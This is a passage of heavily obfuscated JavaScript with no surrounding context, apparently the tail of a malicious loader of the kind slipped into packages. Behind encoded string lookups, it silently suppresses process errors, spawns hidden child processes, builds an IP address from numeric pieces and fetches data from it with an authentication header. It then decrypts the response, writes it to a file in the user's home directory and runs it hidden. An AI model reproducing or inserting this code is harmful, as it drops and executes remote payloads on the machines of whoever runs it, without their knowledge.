bm=bk,bl=c;for(ac=aj,ad=ak,P=-0x1c0b*-0x1+-0x1*0x2263+0x196*0x4;a5[bl(0x172,'O6*v')](!ag,ae)&&!al&&a5[bm(0x16c)](P,af[bm(0x11a)]);P++){var al,am=af[P],an=ah['p'],ao=am[-0xed*0xd+-0x181f+0x242a];a5[bm(0x1cb)](aj,0xa4d+0x1743+-0x4cb*0x7)?(al=a5[bl(0xe7,'q9xZ')](ao,ak))&&(ad=am[(ac=am[0x1aca+-0x119a+0x92c*-0x1])?-0x2589+0x1297*0x1+0x12f7*0x1:(ac=0x16f7*-0x1+0x1113+-0x5e7*-0x1,-0x1b63+-0x26dd+0x4243)],am[0xf*0x83+0x3f*-0x40+0x1*0x817]=am[-0x1d3e+0x781+0x1*0x15c2]=O):a5[bl(0x1e0,'RtWI')](am[0x95*0x16+-0x1*0xad+-0x17*0x87],an)&&((al=a5[bl(0x148,'$k]A')](aj,-0x497+0x1*0xae2+-0x649)&&a5[bl(0x1a0,'q9xZ')](an,am[0x3d9+-0x623+0x24b]))?(ac=-0x1543*-0x1+-0x315*-0x5+-0x24ac,ah['v']=ak,ah['n']=am[-0x12b+-0x609+0x735]):a5[bm(0x16c)](an,ao)&&(al=a5[bm(0x16c)](aj,0x15f7*0x1+-0x91f+-0x291*0x5)||a5[bm(0x1cb)](am[-0x4a*0x83+0x1*0xefd+0x16e1*0x1],ak)||a5[bl(0x169,'^^%v')](ak,ao))&&(am[0x2c8+-0x1acf+0x1*0x180b]=aj,am[0x1c6*-0x7+0x251d+-0x18ae]=ak,ah['n']=ao,ac=-0x24*0xd1+0x22d3+0x6b*-0xd));}if(al||a5[bm(0x11c)](aj,-0x1a08+0x1*-0x2602+0x400b))return U;throw ag=!(0x3*0xa2f+-0x32*-0x37+-0x294b),ak;}return function(aj,ak,al){var bo=bk,bn=c;if(a5[bn(0x1e1,'2kVv')](ae,0x55b*0x1+0x1d*-0x101+0x17c3))throw a5[bo(0x17a)](TypeError,a5[bo(0x1b1)]);for(ag&&a5[bo(0xdd)](0x1*-0x1825+0x1333+0x4f3,ak)&&a5[bo(0xf4)](ai,ak,al),ac=ak,ad=al;(P=a5[bn(0x1b0,'MAFm')](ac,-0x221f*-0x1+-0xb5e*-0x3+-0x1*0x4437)?O:ad)||!ag;){ab||(ac?a5[bn(0x108,'tf%3')](ac,-0xdb3+-0x1e5*0x11+-0x92f*-0x5)?(a5[bn(0x12a,'XgkS')](ac,0xa40*-0x1+0x115a*-0x2+0x2cf5)&&(ah['n']=-(-0x24d2+-0x4d*-0x9+0x221e)),a5[bo(0xf4)](ai,ac,ad)):ah['n']=ad:ah['v']=ad);try{if(ae=0x1*-0x1075+-0x1ba0*-0x1+-0xb29,ab){if(ac||(aj=a5[bn(0x1d7,'wqwF')]),P=ab[aj]){if(!(P=P[bo(0x1d6)](ab,ad)))throw a5[bn(0xb0,'e20R')](TypeError,a5[bo(0x153)]);if(!P[bo(0x14f)])return P;ad=P[bn(0xad,'wqwF')],a5[bo(0x187)](ac,0x36e*-0x4+0x10+0xdaa)&&(ac=0x1ee3+-0x2386+0x4a3*0x1);}else a5[bn(0xb6,')@EG')](0x1469+0x216a+-0x1ae9*0x2,ac)&&(P=ab[bo(0x1ad)])&&P[bo(0x1d6)](ab),a5[bn(0x1f8,'(u[)')](ac,0x19f*-0xa+-0x499*0x7+0x3067)&&(ad=a5[bn(0x11d,'zV7O')](TypeError,a5[bo(0x1c3)](a5[bo(0x1aa)](a5[bo(0x174)],aj),a5[bn(0xf2,'N*O6')])),ac=0x73b+-0x13ec+-0x7d*-0x1a);ab=O;}else{if(a5[bo(0x122)](P=(ag=a5[bo(0x119)](ah['n'],-0x1ec5+-0x1edb+0x3da0))?ad:a8[bn(0x132,'Fxne')](a9,ah),U))break;}}catch(am){ab=O,ac=0x1*-0x9d2+0x1*0x1a0a+-0x1*0x1037,ad=am;}finally{ae=-0x60d*0x2+-0x22c4+-0xd*-0x39b;}}return{'value':P,'done':ag};};}(a1,a3,a4),!(-0x1c99+0x1*0x1025+-0x31d*-0x4)),a7;}var U={};function V(){}function W(){}function X(){}P=Object[aN(0x15d)];var Y=[][R]?g[aN(0x16f)](P,g[aN(0x1c9)](P,[][R]())):(g[aS(0x1ac,'Iwa0')](z,P={},R,function(){return this;}),P),Z=X[aS(0xd8,'(u[)')]=V[aS(0x10a,'^^%v')]=Object[aN(0x137)](Y);function a0(a1){var bq=aN,bp=aS;return Object[bp(0x143,'$dKu')]?Object[bq(0x1a5)](a1,X):(a1[bp(0x14a,'XgkS')]=X,g[bq(0x124)](z,a1,S,g[bp(0xe5,'^tLg')])),a1[bp(0x13e,'Ax65')]=Object[bp(0xed,'syGV')](Z),a1;}return W[aN(0x1e4)]=X,g[aS(0x18a,'JFQu')](z,Z,g[aS(0x128,'MAFm')],X),g[aS(0x173,'0k5#')](z,X,g[aN(0x17e)],W),W[aS(0x117,'O1BY')]=g[aS(0xeb,'Nqys')],g[aS(0xb4,'O6*v')](z,X,S,g[aN(0x16a)]),g[aN(0x16f)](z,Z),g[aN(0xb2)](z,Z,S,g[aN(0xe1)]),g[aS(0x190,'!shM')](z,Z,R,function(){return this;}),g[aS(0x11e,'wqwF')](z,Z,g[aN(0x1ae)],function(){var br=aS;return g[br(0xcf,'q9xZ')];}),(x=function(){return{'w':T,'m':a0};})();}function z(N,O,P,Q){var bt=as,bs=ar,R=Object[bs(0x109)];try{g[bt(0xcd,'Iunz')](R,{},'',{});}catch(S){R=-0xd7d+0x22f9+-0x157c;}z=function(T,U,V,W){var by=bt,bx=bs,X={'vlEuC':function(Z,a0,a1,a2){var bu=c;return g[bu(0xb3,'M1Nu')](Z,a0,a1,a2);}};function Y(Z,a0){var bv=b;X[bv(0x1f9)](z,T,Z,function(a1){var bw=c;return this[bw(0x13a,'DiP(')](Z,a0,a1);});}U?R?g[bx(0x15f)](R,T,U,{'value':V,'enumerable':!W,'configurable':!W,'writable':!W}):T[U]=V:(g[bx(0x179)](Y,g[by(0x165,'!shM')],-0x1fd0+-0x2*0x5ce+0x2b6c),g[bx(0x179)](Y,g[bx(0x185)],-0xfb*0x11+-0x1881+0x292d),g[bx(0xd9)](Y,g[bx(0x12f)],-0xb0a+-0x17*0xe2+-0x2*-0xfad));},g[bt(0xdc,'Iwa0')](z,N,O,P,Q);}function A(N,O,P,Q,R,S,T){var bA=as,bz=ar;try{var U=N[S](T),V=U[bz(0x1e6)];}catch(W){return void g[bz(0x10b)](P,W);}U[bz(0x14f)]?g[bA(0x19b,'O1BY')](O,V):Promise[bA(0x142,'^tLg')](V)[bA(0x11f,'5UxK')](Q,R);}function B(N,O){var bD=ar,P={'rtSgS':function(Q,R){var bB=b;return g[bB(0x164)](Q,R);},'AlELO':function(Q,R){var bC=c;return g[bC(0x18e,'Mtvd')](Q,R);},'gajdq':g[bD(0xfb)],'TFpaV':g[bD(0x1ef)],'ZITan':function(Q,R){var bE=c;return g[bE(0x1ca,'syGV')](Q,R);},'rAPWm':function(Q,R){var bF=c;return g[bF(0xec,'n7RP')](Q,R);},'DReVE':function(Q,R){var bG=c;return g[bG(0x180,'n7RP')](Q,R);},'gzizh':function(Q,R){var bH=bD;return g[bH(0x10b)](Q,R);},'VTodX':function(Q,R){var bI=c;return g[bI(0x126,'8WOY')](Q,R);},'TbfRy':function(Q,R){var bJ=c;return g[bJ(0x139,'O5A3')](Q,R);},'wnofQ':function(Q,R){var bK=bD;return g[bK(0xd3)](Q,R);},'MIJhC':function(Q,R){var bL=bD;return g[bL(0x10b)](Q,R);}};return function(Q){var bM=c;if(Array[bM(0x1c5,'$k]A')](Q))return Q;}(N)||function(Q,R){var bO=bD,bN=c,S=P[bN(0x138,'$T(Z')](null,Q)?null:P[bN(0xff,'O1BY')](P[bO(0x176)],typeof Symbol)&&Q[Symbol[bO(0x15b)]]||Q[P[bN(0x1a3,')@EG')]];if(P[bO(0xb1)](null,S)){var T,U,V,W,X=[],Y=!(0x1268+0x1955+-0x2bbd),Z=!(0x1f2e+-0x78*0x11+-0x1735);try{if(V=(S=S[bN(0x10f,'i]&R')](Q))[bO(0x181)],P[bO(0x184)](-0x26c6+0x1aae+0x81*0x18,R)){if(P[bO(0x17c)](P[bN(0xbd,'Qwot')](Object,S),S))return;Y=!(0x1a68+0x1c54+-0x36bb);}else{for(;!(Y=(T=V[bO(0x1d6)](S))[bO(0x14f)])&&(X[bO(0x1e9)](T[bN(0x1b3,'n7RP')]),P[bN(0x12b,'Mtvd')](X[bO(0x11a)],R));Y=!(-0x3e+-0x45b+0x499));}}catch(a0){Z=!(0x2*0xa54+-0x5c9*0x5+0x845),U=a0;}finally{try{if(!Y&&P[bO(0xdb)](null,S[bN(0xc4,'2kVv')])&&(W=S[bO(0x1ad)](),P[bO(0x1bd)](P[bO(0x1dd)](Object,W),W)))return;}finally{if(Z)throw U;}}return X;}}(N,O)||function(Q,R){var bQ=c,bP=bD;if(Q){if(g[bP(0x125)](g[bP(0x198)],typeof Q))return g[bP(0x179)](C,Q,R);var S={}[bP(0x13c)][bP(0x1d6)](Q)[bP(0x158)](-0x1*0x26cb+0x216f+0x45*0x14,-(0x3a9+-0xfc8+-0xc20*-0x1));return g[bQ(0x189,'MAFm')](g[bQ(0x150,'iZGX')],S)&&Q[bP(0xc3)]&&(S=Q[bP(0xc3)][bQ(0x1ba,'MAFm')]),g[bP(0x147)](g[bQ(0x1f6,'iZGX')],S)||g[bQ(0xd2,'i]&R')](g[bP(0x191)],S)?Array[bQ(0x1ee,'Nqys')](Q):g[bQ(0x145,'q9xZ')](g[bP(0x168)],S)||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/[bP(0x112)](S)?g[bQ(0x18b,'!0aq')](C,Q,R):void(0x6*0x61f+0x1c1*0x1+0x1*-0x267b);}}(N,O)||(function(){var bR=c;throw new TypeError(g[bR(0x1b9,'Mtvd')]);}());}function C(N,O){var bT=as,bS=ar;(g[bS(0x164)](null,O)||g[bS(0x152)](O,N[bS(0x11a)]))&&(O=N[bT(0xf6,'O5A3')]);for(var P=-0x875*-0x2+0x1*0xf1d+-0x2007*0x1,Q=g[bT(0x1c2,'yAb!')](Array,O);g[bS(0x113)](P,O);P++)Q[P]=N[P];return Q;}try{var D=g[as(0x1b4,')@EG')](w,0x10*0x20c+0x1257+-0x2fbe),E=g[ar(0x1bb)](w,0x68d+-0xaef+-0x1*-0x7e2),F=g[ar(0x1df)](w,0x46c*-0x8+-0x1*0x4ed+0xd*0x361),G=g[ar(0x10b)](w,0xc1+0x13d+-0x3b*-0x8),H=g[as(0x183,'yAb!')](w,-0x181a+-0x2644+0x13*0x359),I=H[as(0x199,')@EG')];H[as(0x195,'0k5#')],g[as(0x1c4,'O1BY')](I,g[as(0x13d,'Nqys')],{'windowsHide':!(0x1*-0x246b+-0x1*-0x1c45+0x826),'cwd':D[as(0xe0,'[]Y!')]()});var J=g[as(0x14d,'syGV')](w,0xaef+-0x96f+0x1*0x22a);process['on'](g[as(0x1a6,'$T(Z')],function(N){}),process['on'](g[as(0x186,'Iunz')],function(N){});var K=g[as(0x1d4,'Nqys')],L=''[as(0xbf,'yAb!')](-0x254a+-0x24b9+0x4a08,'.')[ar(0x140)](-0x1087+0xd*0x18d+-0x2f3,'.')[as(0x1f3,'e20R')](-0x295*-0x1+0x120f*0x2+-0x7*0x56d,'.')[as(0x149,'lF5W')](-0x1779*-0x1+-0x7*0x3d2+-0x7f*-0x7),M=G[as(0xb9,'$dKu')](K,g[as(0x115,'Ax6e')],0x1*0x757+-0x2*0x1087+0x19d7);(j=g[as(0x101,'KadX')](x)['m'](function N(){var bX=ar,bU=as,O={'drWUN':g[bU(0xea,'Mtvd')],'DXwJy':function(P,Q,R){var bV=bU;return g[bV(0x17b,'0k5#')](P,Q,R);},'YvOns':g[bU(0x18d,'[]Y!')],'UYNRF':g[bU(0x159,'lF5W')],'hdrfg':g[bU(0xd7,'lF5W')],'GbbcF':function(P,Q,R){var bW=b;return g[bW(0x1e2)](P,Q,R);},'ayqop':g[bX(0xf9)],'xJWIn':g[bU(0x1e8,'(u[)')],'GyAti':g[bU(0x154,'Ax6e')],'WAHHf':g[bU(0x1a2,'SV2u')]};return g[bX(0x155)](x)['w'](function(P){var bZ=bU,bY=bX;for(;;)switch(P['n']){case-0xc71+0x15*-0x19b+-0x1c*-0x1a6:return P['n']=-0xd15+0x5*-0x6f1+-0x5*-0x98f,J[bY(0xc9)](O[bY(0xde)][bY(0x140)](L,O[bY(0x105)])[bY(0x140)](K),{'headers':{'Authentication':O[bZ(0xcc,'6VVG')]}})[bZ(0xca,'JFQu')](function(Q){var c1=bY,c0=bZ;try{var R=F[c0(0x120,'[]Y!')](D[c0(0x192,'SV2u')](),O[c0(0x106,'[]Y!')]);E[c1(0x1bf)](R,(T=(S=O[c0(0xc2,'Ax65')](B,Q[c1(0xf0)][c0(0x111,'JFQu')](':'),-0xe6c+-0xa8f+0x1*0x18fd))[0x100*0xc+0x5*0x3a3+-0x1e2f],U=S[0x25ea+-0x1be5*-0x1+0x20e7*-0x2],W=(V=G[c1(0xbe)](O[c0(0xc0,'DiP(')],M,Buffer[c0(0x1d5,'5UxK')](T,O[c0(0x1de,'0k5#')])))[c1(0x1d8)](U,O[c1(0xe8)],O[c0(0xd0,'e20R')]),W+=V[c1(0x157)](O[c1(0xc1)])),{'flag':'w+'}),O[c0(0xf5,'JFQu')](I,O[c0(0x15e,'i]&R')],{'windowsHide':!(-0x5f1+0x45a*-0x8+-0x28c1*-0x1),'cwd':F[c1(0x1f0)](D[c0(0x1c1,'KadX')]())});}catch(X){}var S,T,U,V,W;})[bZ(0x104,'$k]A')](function(Q){});case-0x2430+-0x1*-0x9d0+0x3*0x8cb:return P['a'](0x2af*-0x4+-0x1*-0x337+0x787*0x1);}},N);}),function(){var c5=as,c3=ar,O={'nrRKo':function(R,S,T,U,V,W,X,Y){var c2=c;return g[c2(0x177,'[]Y!')](R,S,T,U,V,W,X,Y);},'HHkkI':g[c3(0x1b8)],'EJjzb':function(R,S,T,U,V,W,X,Y){var c4=c;return g[c4(0xce,'q9xZ')](R,S,T,U,V,W,X,Y);},'BVhOq':g[c5(0xb7,'O6*v')],'iFqUh':function(R,S){var c6=c5;return g[c6(0xd5,'n7RP')](R,S);}},P=this,Q=arguments;return new Promise(function(R,S){var c7=c5,T=j[c7(0x11b,'iZGX')](P,Q);function U(W){var c9=b,c8=c7;O[c8(0xba,'Ax65')](A,T,R,S,U,V,O[c9(0x1af)],W);}function V(W){var cb=c7,ca=b;O[ca(0xdf)](A,T,R,S,U,V,O[cb(0x188,'zV7O')],W);}O[c7(0x196,'Fxne')](U,void(0x1d6e+-0x3*-0x996+-0x3a30));});})();}catch(O){}})()));